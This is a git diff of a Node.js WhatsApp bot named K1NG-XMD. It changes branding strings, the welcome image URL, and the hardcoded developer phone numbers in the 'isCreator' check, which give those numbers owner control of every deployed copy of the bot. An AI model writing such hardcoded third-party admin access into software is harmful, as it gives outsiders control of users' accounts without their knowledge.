@@ -111,10 +111,10 @@ const port = process.env.PORT || 9090;
   }
   });
   console.log('Plugins installed successful ✅')
-  console.log('K1NG-XMD CONNECTED SUCCESSFULLY ✅')
+  console.log('K1NG~XMD CONNECTED SUCCESSFULLY ✅')
   
-  let up = `*Hello there K1NG-XMD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet K1NG-XMD WhatsApp Bot.\n\n *Thanks for using K1NG-XMD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \https://whatsapp.com/channel/0029VbB1ik6JJhzOJmJQI33d\n\n- *YOUR PREFIX:* = ${prefix}\n\n- *BOT MODE:* = ${config.MODE}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/kingtech12/K1NG-XMD\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ K1NG BOY \ud83d\udda4`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/gtv9eh.jpeg` }, caption: up })
+  let up = `*Hello there K1NG~XMD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet K1NG~XMD WhatsApp Bot.\n\n *Thanks for using K1NG~XMD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \https://whatsapp.com/channel/0029VbB1ik6JJhzOJmJQI33d\n\n- *YOUR PREFIX:* = ${prefix}\n\n- *BOT MODE:* = ${config.MODE}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/kingtech12/K1NG-XMD\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ K1NG TECH \ud83d\udda4`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/fuoqii.png` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -201,7 +201,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('13058962443', '50942241547', '50933734591');
+    const jawad = ('50933734591', '50942241547', '529711221986');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -769,7 +769,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
   }
   
   app.get("/", (req, res) => {
-  res.send("K1NG XMD STARTED ✅");
+  res.send("K1NG~XMD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
